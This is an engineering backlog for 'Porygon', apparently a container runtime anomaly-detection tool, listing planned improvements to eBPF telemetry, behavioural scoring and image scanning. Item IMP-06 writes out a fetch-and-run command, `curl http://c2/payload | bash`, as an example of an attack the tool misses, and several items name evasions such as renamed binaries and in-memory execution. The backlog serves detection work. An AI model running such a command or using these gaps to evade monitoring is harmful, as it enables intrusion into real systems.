# Porygon Improvements Backlog

Actionable engineering and security tasks remaining to be implemented. All completed and design-rejected items have been removed.

---

## Open Tasks Matrix

| ID | Component | Severity | Issue | Target Implementation |
|:---|:---|:---:|:---|:---|
| **IMP-06** | Jensen-Shannon Engine | **CRITICAL** | Omits `command_line` arguments; LotL attacks score 0.000 | Tokenized argument/flag n-grams in V2 behavioral schema |
| **IMP-02** | Falco eBPF Tracepoints | **HIGH** | Only hooks `execve`; blind to sockets and in-memory execution | Multi-syscall eBPF rules for `connect`, `openat`, `memfd_create` |
| **IMP-07** | ML Classifier | **HIGH** | Static frozen sets on basenames bypassed by renaming (`/tmp/helper`) | Behavioral heuristics (unlinked inode, unprivileged paths) |
| **IMP-08** | $z$-Score Deviation | **HIGH** | High tolerance threshold misses rare shell executions | Step-penalty / non-linear scaling for zero-baseline behaviors |
| **IMP-15** | Trivy Scanner | **MEDIUM** | Strict `RepoDigests` check fails locally built or staging images | Local image ID and manifest hash fallback (`local:<image_id>`) |

---

## 1. Kernel Telemetry & Ingestion

### IMP-02: Multi-Syscall Telemetry Expansion Beyond Execve
* **Code Reference:** [`falco/porygon_rules.yaml:3-5`](file:///home/anuruprkris/Project/final_yeat_work/falco/porygon_rules.yaml#L3-L5)
* **Issue:** Hooking only `execve`/`execveat` misses in-memory exploits (`memfd_create`), process injection (`ptrace`), outbound C2 sockets (`connect`), and file tampering (`openat`).
* **Action:**
  1. Add Falco rules for non-loopback outbound socket connections (`connect`, `accept`).
  2. Instrument executable memory creation (`memfd_create`).
  3. Normalize in `porygon_telemetry` with `runtime_action in ("exec", "net_outbound", "mem_alloc", "file_modify")`.

---

## 2. Statistical Modeling & Behavioral Profiling

### IMP-06: Argument-Aware Behavioral Distance Scoring (LotL Defense)
* **Code Reference:** [`backend/src/porygon_api/scoring.py:17-51`](file:///home/anuruprkris/Project/final_yeat_work/backend/src/porygon_api/scoring.py#L17-L51) & [`backend/src/porygon_api/baseline.py:123-145`](file:///home/anuruprkris/Project/final_yeat_work/backend/src/porygon_api/baseline.py#L123-L145)
* **Issue:** Divergence engine only scores binary basenames; attacks using legitimate binaries (`curl http://c2/payload | bash`) score 0.000 drift.
* **Action:**
  1. Extract subcommand, flag, and parameter tokens in `baseline.py`.
  2. Add `command_tokens` as a 7th feature group in Jensen-Shannon calculations with weight $\approx 0.20$.
  3. Version-gate schema upgrade (`FEATURE_SCHEMA_VERSION = "porygon.behaviour.v2"`) to preserve frozen V1 research baselines.

### IMP-07: Behavioral Heuristics Over Static Binary Matching
* **Code Reference:** [`backend/src/porygon_api/ml_classifier.py:42-81`](file:///home/anuruprkris/Project/final_yeat_work/backend/src/porygon_api/ml_classifier.py#L42-L81)
* **Issue:** Taxonomy sets (`SHELL_BINARIES`, `RECON_BINARIES`) rely on exact basename string matching, easily bypassed by renaming binaries (`/tmp/helper`).
* **Action:**
  1. Add behavioral indicators: execution from writable dirs (`/tmp`, `/dev/shm`), unlinked executables (`(deleted)`), unmanaged binaries.
  2. Feed indicators directly into the random forest classifier.

### IMP-08: Logarithmic/Non-Linear Numeric Scaling for Rare Shells
* **Code Reference:** [`backend/src/porygon_api/scoring.py:112-140`](file:///home/anuruprkris/Project/final_yeat_work/backend/src/porygon_api/scoring.py#L112-L140)
* **Issue:** Gaussian $z$-score tolerance floor ignores isolated shell invocations in normally shell-less containers.
* **Action:**
  1. Apply step-penalty functions for zero-tolerance behaviors (e.g. baseline shell ratio 0.000 $\rightarrow$ non-zero execution scores $\ge 0.70$).
  2. Use Poisson or negative binomial anomaly transforms for sparse event counts.

---

## 3. Platform & Vulnerability Scanner

### IMP-15: Local & Staging Image Support in Trivy Scanner
* **Code Reference:** [`scanner/src/porygon_scanner/scanner.py:165-170`](file:///home/anuruprkris/Project/final_yeat_work/scanner/src/porygon_scanner/scanner.py#L165-L170)
* **Issue:** Strict check on `RepoDigests` aborts scanning for locally built or staging images lacking registry pushes.
* **Action:**
  1. Support explicit local image identities (`local:<image_id>`).
  2. Fall back to image config digest or rootfs hash when `RepoDigests` is empty.
